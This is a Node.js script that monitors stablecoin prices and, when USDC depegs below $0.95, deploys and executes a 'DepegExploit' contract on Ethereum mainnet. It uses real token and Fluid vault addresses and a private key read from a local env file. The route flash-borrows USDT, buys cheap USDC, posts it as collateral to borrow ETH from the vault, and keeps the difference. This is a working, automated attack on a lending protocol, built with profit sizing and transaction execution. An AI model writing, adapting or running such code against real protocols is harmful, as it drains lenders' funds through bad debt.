// deploy-depeg.js - deploy + execute DepegExploit when E5 fires.
// Only the USDC depeg route is executable: flash USDT, buy USDC collateral,
// borrow ETH from Fluid VaultT1_USDC_ETH, and repay USDT.
//
// Usage:
//   node tools/deploy-depeg.js --check
//   node tools/deploy-depeg.js --watch
//   node tools/deploy-depeg.js --deploy
//   node tools/deploy-depeg.js --execute

const { ethers } = require("ethers");
const fs = require("fs");
const path = require("path");

const STABLECOINS = [
  { symbol: "USDC", pair: "USDCUSDT", threshold: 0.95, address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, vault: "0x348aD11DB2c90e7FdF8e57420C569F76dBe38a59", invert: false },
  { symbol: "USDT", pair: "USDCUSDT", threshold: 1.05, address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, vault: null, invert: true },
  { symbol: "DAI", pair: "DAIUSDT", threshold: 0.95, address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, vault: null, invert: false, skip: true },
];

const E5_EXECUTION_TOKENS = new Set(["USDC"]);
const EXEC_GAS_LIMIT = 3_000_000;
const DEPLOY_GAS_LIMIT = 2_000_000;
const ENV_FILE = path.join(__dirname, "..", ".env.exploit");
const RPC_FILE = path.join(__dirname, "..", "rpc_endpoints.txt");
const EXPLOIT_DIR = path.join(__dirname, "..", "exploits", "depeg-exploit");
const DEPLOY_FILE = path.join(EXPLOIT_DIR, "deploy.json");
const ABI_FILE = path.join(EXPLOIT_DIR, "out", "DepegExploit.sol", "DepegExploit.json");

function loadEnv() {
  if (!fs.existsSync(ENV_FILE)) { console.error(".env.exploit not found"); process.exit(1); }
  const env = {};
  fs.readFileSync(ENV_FILE, "utf8").split("\n").forEach(line => {
    const [k, ...v] = line.trim().split("=");
    if (k && v.length) env[k] = v.join("=").replace(/^["']|["']$/g, "");
  });
  if (!env.PRIVATE_KEY) { console.error("PRIVATE_KEY not found in .env.exploit"); process.exit(1); }
  return env;
}

function extractRpcUrls() {
  if (!fs.existsSync(RPC_FILE)) { console.error("rpc_endpoints.txt not found"); process.exit(1); }
  return [...fs.readFileSync(RPC_FILE, "utf8").matchAll(/https?:\/\/[^\s'"<>]+/g)].map(m => m[0]);
}

async function rpcCall(url, method, params, timeoutMs = 8000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
      signal: ctrl.signal,
    });
    const json = await res.json();
    return json.result || null;
  } catch (_) {
    return null;
  } finally {
    clearTimeout(t);
  }
}

async function resolveRpcUrl(chainId = 1) {
  for (const url of extractRpcUrls()) {
    const id = await rpcCall(url, "eth_chainId", []);
    if (id && parseInt(id, 16) === chainId) return url;
  }
  console.error(`Could not resolve RPC for chain ${chainId}`);
  process.exit(1);
}

function envEnabled(env, name) {
  return env[name] === "1" || process.env[name] === "1";
}

function requireLiveGate(env, name, action) {
  if (envEnabled(env, name)) return;
  console.error(`REFUSING ${action}: set ${name}=1 explicitly after fork/local tests pass.`);
  process.exit(1);
}

function loadBytecode() {
  try {
    const artifact = JSON.parse(fs.readFileSync(ABI_FILE, "utf8"));
    return { abi: artifact.abi, bytecode: artifact.bytecode?.object || artifact.bytecode };
  } catch (_) {
    console.error(`Compiled artifact not found: ${ABI_FILE}`);
    console.error("Run: cd exploits/depeg-exploit && forge build");
    process.exit(1);
  }
}

function artifactHash(bytecode) {
  return ethers.keccak256(bytecode);
}

function saveDeploy(address, txHash, gasUsed, bytecode) {
  fs.writeFileSync(DEPLOY_FILE, JSON.stringify({
    address,
    txHash,
    gasUsed,
    artifactBytecodeHash: artifactHash(bytecode),
    deployedAt: new Date().toISOString(),
  }, null, 2));
}

function loadVerifiedDeploy(bytecode) {
  if (!fs.existsSync(DEPLOY_FILE)) { console.error("No deploy.json found. Run --deploy first."); process.exit(1); }
  const deploy = JSON.parse(fs.readFileSync(DEPLOY_FILE, "utf8"));
  if (deploy.artifactBytecodeHash !== artifactHash(bytecode)) {
    console.error("deploy.json was not produced from the current artifact; redeploy before execution.");
    process.exit(1);
  }
  return deploy;
}

async function bufferedGasPrice(provider) {
  const rawGasPrice = await provider.send("eth_gasPrice", []);
  return BigInt(rawGasPrice) * 150n / 100n;
}

function decimalString(value, decimals) {
  if (!Number.isFinite(value) || value <= 0) return "0";
  const places = Math.min(Math.max(decimals, 0), 18);
  return value.toFixed(places).replace(/\.0+$/, "").replace(/(\.\d*?)0+$/, "$1");
}

function parseUnitsFromNumber(value, decimals) {
  return ethers.parseUnits(decimalString(value, decimals), decimals);
}

async function getLiveEthPrice() {
  try {
    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd", { signal: AbortSignal.timeout(5000) });
    const j = await r.json();
    return j?.ethereum?.usd || null;
  } catch (_) {
    return null;
  }
}

async function getPrices() {
  const prices = [];
  for (const s of STABLECOINS) {
    if (s.skip) continue;
    try {
      const r = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${s.pair}`, { signal: AbortSignal.timeout(3000) });
      const j = await r.json();
      const price = parseFloat(j.price);
      const effectivePrice = s.invert ? (1 / price) : price;
      const depegged = s.invert ? (price > s.threshold) : (price < s.threshold);
      prices.push({ ...s, price, effectivePrice, depegged });
    } catch (_) {
      prices.push({ ...s, price: null, effectivePrice: null, depegged: false });
    }
  }
  return prices;
}

async function cmdCheck() {
  const prices = await getPrices();
  console.log("Stablecoin Prices");
  for (const p of prices) {
    const price = Number.isFinite(p.effectivePrice) ? p.effectivePrice.toFixed(4) : "?";
    const flag = p.depegged ? " DEPEGGED" : "";
    console.log(`  ${p.symbol}: ${price} (trigger: ${p.invert ? `${p.pair}>${p.threshold}` : `<${p.threshold}`})${flag}`);
  }
  console.log("\nExecutable route: USDC depeg only, Fluid VaultT1_USDC_ETH (CF 87%).");
  console.log("Signed deploy/execute requires ALLOW_LIVE_DEPLOY=1 / ALLOW_LIVE_EXECUTION=1.");
}

async function cmdDeploy(provider, wallet, env) {
  requireLiveGate(env, "ALLOW_LIVE_DEPLOY", "live E5 deployment");
  const { abi, bytecode } = loadBytecode();
  const factory = new ethers.ContractFactory(abi, bytecode, wallet);
  const gasPrice = await bufferedGasPrice(provider);
  console.log(`Wallet:    ${wallet.address}`);
  console.log(`Balance:   ${ethers.formatEther(await provider.getBalance(wallet.address))} ETH`);
  console.log(`Gas price: ${ethers.formatUnits(gasPrice, "gwei")} gwei`);
  console.log("Deploying DepegExploit...");
  const contract = await factory.deploy({ gasLimit: DEPLOY_GAS_LIMIT, gasPrice });
  await contract.waitForDeployment();
  const addr = await contract.getAddress();
  const receipt = await contract.deploymentTransaction().wait();
  console.log(`Deployed: ${addr}`);
  console.log(`Tx:       ${receipt.hash}`);
  console.log(`Gas used: ${receipt.gasUsed.toString()}`);
  saveDeploy(addr, receipt.hash, Number(receipt.gasUsed), bytecode);
  console.log("Saved deploy.json");
  return addr;
}

async function buildExecutionParams(alertPrice, gasPrice) {
  const depegPrice = Number(alertPrice);
  if (!Number.isFinite(depegPrice) || depegPrice <= 0 || depegPrice >= 0.95) {
    throw new Error("USDC depeg window is not open");
  }
  const strong = STABLECOINS.find(s => s.symbol === "USDT");
  const depegged = STABLECOINS.find(s => s.symbol === "USDC");
  const severity = 1 - depegPrice;
  const baseFlashUsd = Number(process.env.E5_BASE_FLASH_USD || "1000");
  const maxFlashUsd = Number(process.env.E5_MAX_FLASH_USD || "100000");
  const flashUsd = Math.min(Math.max(baseFlashUsd * (1 + severity * 10), baseFlashUsd), maxFlashUsd);
  const depeggedUsdAmount = flashUsd / depegPrice * 0.985;
  const ethPerUsd = await getLiveEthPrice().then(p => p || 2000).catch(() => 2000);
  const borrowUsdWorth = depeggedUsdAmount * 0.87 * 0.98;
  const grossTokenProfitUsd = borrowUsdWorth - flashUsd;
  const gasCostUsd = (EXEC_GAS_LIMIT * Number(gasPrice) / 1e18) * ethPerUsd;
  const minProfitUsd = gasCostUsd * 1.2;
  const netProfitUsd = grossTokenProfitUsd - gasCostUsd;
  return {
    strong,
    depegged,
    depegPrice,
    strongFlashAmount: parseUnitsFromNumber(flashUsd, strong.decimals),
    depeggedAmount: parseUnitsFromNumber(depeggedUsdAmount, depegged.decimals),
    borrowEth: parseUnitsFromNumber(borrowUsdWorth / ethPerUsd, 18),
    minProfitStrong: parseUnitsFromNumber(minProfitUsd, strong.decimals),
    grossTokenProfitUsd,
    minProfitUsd,
    netProfitUsd,
  };
}

async function executeOnce(provider, wallet, env, price) {
  requireLiveGate(env, "ALLOW_LIVE_EXECUTION", "live E5 execution");
  const { abi, bytecode } = loadBytecode();
  const deploy = loadVerifiedDeploy(bytecode);
  const gasPrice = await bufferedGasPrice(provider);
  const params = await buildExecutionParams(price, gasPrice);
  if (params.grossTokenProfitUsd <= params.minProfitUsd) {
    throw new Error(`Unprofitable after live gas: gross=$${params.grossTokenProfitUsd.toFixed(0)} min=$${params.minProfitUsd.toFixed(0)}`);
  }
  const exploit = new ethers.Contract(deploy.address, abi, wallet);
  console.log(`Executing E5: USDC=$${params.depegPrice.toFixed(4)} borrow=${ethers.formatEther(params.borrowEth)} ETH est net=$${params.netProfitUsd.toFixed(0)}`);
  const tx = await exploit.execute(
    params.strong.address,
    params.depegged.address,
    params.strongFlashAmount,
    params.depeggedAmount,
    params.borrowEth,
    params.minProfitStrong,
    { gasLimit: EXEC_GAS_LIMIT, gasPrice }
  );
  console.log(`Tx sent: ${tx.hash}`);
  const receipt = await tx.wait();
  console.log(`Confirmed in block ${receipt.blockNumber}, gas ${receipt.gasUsed}`);
}

async function cmdExecuteOnce(provider, wallet, env) {
  const prices = await getPrices();
  const usdc = prices.find(p => p.symbol === "USDC");
  if (!usdc?.depegged || !Number.isFinite(usdc.effectivePrice)) {
    console.error("USDC depeg window is not open; refusing execution.");
    process.exit(1);
  }
  await executeOnce(provider, wallet, env, usdc.effectivePrice);
}

async function cmdWatch() {
  const provider = new ethers.JsonRpcProvider(await resolveRpcUrl(1));
  const env = loadEnv();
  const wallet = new ethers.Wallet(env.PRIVATE_KEY, provider);
  let deployed = false;
  let deployAddr = null;

  if (fs.existsSync(DEPLOY_FILE)) {
    const d = JSON.parse(fs.readFileSync(DEPLOY_FILE, "utf8"));
    deployAddr = d.address;
    deployed = true;
  }

  console.log(`DEPEG BOT: ${wallet.address}`);
  console.log(`Watching: USDC executable; USDT/DAI monitor-only`);
  console.log(`Deployed: ${deployed ? deployAddr : "not yet"}\n`);

  while (true) {
    const now = new Date().toLocaleTimeString();
    const prices = await getPrices();
    const depegged = prices.filter(p => p.depegged);

    if (depegged.length > 0) {
      const worst = depegged[0];
      const price = Number.isFinite(worst.effectivePrice) ? worst.effectivePrice.toFixed(4) : "?";
      console.log(`[${now}] DEPEG DETECTED: ${worst.symbol}=$${price}`);

      if (!E5_EXECUTION_TOKENS.has(worst.symbol)) {
        console.log(`[${now}] ${worst.symbol} is monitor-only; executable route is USDC depeg only.`);
        await new Promise(r => setTimeout(r, 300_000));
        continue;
      }

      const bal = await provider.getBalance(wallet.address);
      if (Number(ethers.formatEther(bal)) < 0.03) {
        console.log(`[${now}] INSUFFICIENT ETH (${ethers.formatEther(bal)} ETH)`);
        await new Promise(r => setTimeout(r, 300_000));
        continue;
      }

      if (!deployed) {
        deployAddr = await cmdDeploy(provider, wallet, env);
        deployed = true;
      }

      await executeOnce(provider, wallet, env, worst.effectivePrice);
      break;
    } else {
      const status = prices.map(p => `${p.symbol}=${Number.isFinite(p.effectivePrice) ? p.effectivePrice.toFixed(4) : "?"}`).join(" ");
      console.log(`[${now}] OK: ${status}`);
    }

    await new Promise(r => setTimeout(r, 300_000));
  }
}

async function main() {
  const args = process.argv.slice(2);
  if (args.includes("--watch")) await cmdWatch();
  else if (args.includes("--deploy")) {
    const provider = new ethers.JsonRpcProvider(await resolveRpcUrl(1));
    const env = loadEnv();
    await cmdDeploy(provider, new ethers.Wallet(env.PRIVATE_KEY, provider), env);
  } else if (args.includes("--execute")) {
    const provider = new ethers.JsonRpcProvider(await resolveRpcUrl(1));
    const env = loadEnv();
    await cmdExecuteOnce(provider, new ethers.Wallet(env.PRIVATE_KEY, provider), env);
  } else {
    await cmdCheck();
  }
}

main().catch(e => { console.error(e.shortMessage || e.message || e); process.exit(1); });
